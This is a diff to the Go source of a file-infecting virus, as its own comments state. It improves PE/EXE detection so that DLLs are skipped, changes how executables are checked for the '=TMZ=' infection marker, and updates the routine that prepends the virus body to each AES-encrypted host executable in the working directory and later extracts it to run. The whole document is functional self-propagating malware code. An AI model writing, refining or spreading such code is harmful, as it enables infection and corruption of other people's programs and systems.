@@ -21,7 +21,6 @@ package main
 
 import (
     "bufio"
-    "fmt"
     "io"
     "io/ioutil"
     "os"
@@ -30,7 +29,9 @@ import (
 	"crypto/aes"
    	"crypto/cipher"
 	"math/rand"
-	"time"	
+	"time"
+	"debug/pe"
+	"encoding/binary"
 
 )
 
@@ -42,50 +43,80 @@ func check(e error) {
     }
 }
 
+func _ioReader(file string) io.ReaderAt {
+	r, err := os.Open(file)
+	check(err)
+	return r
+}
+
 func CheckPE(file string) bool {
-    
-    _, err := pe.Open(file)
-    if err != nil {
-        return false
-    }
-    return true
+	
+	r := _ioReader(file) //reader interface for file
+	f, err := pe.NewFile(r) //open the file as a PE
+	if err != nil {
+		return false //Not a PE file
+	}
+	
+	//Reading DOS header
+	var dosheader [96]byte		
+	r.ReadAt(dosheader[0:], 0)
+	if dosheader[0] == 'M' && dosheader[1] == 'Z' { //if we get MZ
+		signoff := int64(binary.LittleEndian.Uint32(dosheader[0x3c:]))
+		var sign [4]byte
+		r.ReadAt(sign[:], signoff)
+		if !(sign[0] == 'P' && sign[1] == 'E' && sign[2] == 0 && sign[3] == 0) { //if not PE\0\0
+			return false //Invalid PE File Format
+		}
+	}	
+	if (f.Characteristics & 0x2000) == 0x2000 { //IMAGE_FILE_DLL signature
+		return false //it's a DLL, OCX, CPL file, we want a EXE file
+	} 
+	
+	f.Close()
+	return true //it is a valid EXE file
+
 }
 
 func CheckInfected(file string) bool {
-
+	
 	_mark := "=TMZ=" //infection mark
  	fi, err := os.Open(file)
 	check(err)
-	buf := make([]byte, 5)
+	myStat, err := fi.Stat()
+    check(err)	
+	size := myStat.Size()
 	
-    for {
-        // read a chunk of 5 bytes
-		_, err := fi.Read(buf)
-        if err != nil {
-            if err == io.EOF {
-                break //exits when we reach EOF
-            }
-            fmt.Println(err)
-        }
-		
-		if string(buf) == _mark { //if chunk = mark
-			fi.Close()	
-			return true //file is already infected!
-			break
-		}
-		
-	}	
+	buf := make([]byte, size)
+	fi.Read(buf)
 	fi.Close()
-	return false //not infected
-	
+	var x int64
+	for x = 1; x < size; x++ {
+        if buf[x] == _mark[0] {
+			var y int64           
+            for y = 1; y < int64(len(_mark)); y++ {
+                if (x + y) >= size {
+                        break
+					}
+                    if buf[x + y] != _mark[y] {
+                            break
+					}
+                }
+                if y == int64(len(_mark)) {
+                    return true; //infected!
+                }
+			}
+		}
+    return false; //not infected
 }
 
 func Infect(file string) {
 
 	dat, err := ioutil.ReadFile(file) //read host
 	check(err)	
-	vir, err := ioutil.ReadFile(os.Args[0]) //read virus
+	vir, err := os.Open(os.Args[0]) //read virus
 	check(err)
+	virbuf := make([]byte, 3039232)
+	vir.Read(virbuf)
 	
 	encDat := Encrypt(dat) //encrypt host
 	
@@ -93,10 +124,11 @@ func Infect(file string) {
     check(err)
 	
   	w := bufio.NewWriter(f)
-	w.Write(vir) //write virus
+	w.Write(virbuf) //write virus
 	w.Write(encDat) //write encypted host
     w.Flush() //make sure we are all set
 	f.Close()
+	vir.Close()
 	
 }
    
@@ -110,12 +142,12 @@ func RunHost() {
 	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
     check(err)
 	allSZ := len(infected_data) //get file full size
-	hostSZ := allSZ - 2665472 //calculate host size
+	hostSZ := allSZ - 3039232 //calculate host size
 	
 	f, err := os.Open(os.Args[0]) //open host
     check(err)
 		
-	f.Seek(2665472, os.SEEK_SET) //go to host start
+	f.Seek(3039232, os.SEEK_SET) //go to host start
 	
 	hostBuf := make([]byte, hostSZ)
 	f.Read(hostBuf) //read it
@@ -187,7 +219,7 @@ func Rnd(n int) string {
 
 func GetSz(file string) int64 {
 
-	myHnd, err := os.Open(os.Args[0])
+	myHnd, err := os.Open(file)
 	check(err)
 	defer myHnd.Close()
 	myStat, err := myHnd.Stat()
@@ -202,7 +234,7 @@ func main() {
 	virPath := os.Args[0]
 
 	files, _ := ioutil.ReadDir(".")
-	for _, f := range files {
+	for _, f := range files { 
 		if CheckPE(f.Name()) == true {
 			if CheckInfected(f.Name()) == false {
 				if !strings.Contains(virPath, f.Name()) {
@@ -212,7 +244,7 @@ func main() {
 		}
 	}
 
-	if GetSz(os.Args[0]) > 2665472 {
+	if GetSz(os.Args[0]) > 3039232 {
 		RunHost()
 	} else {
 		os.Exit(0)
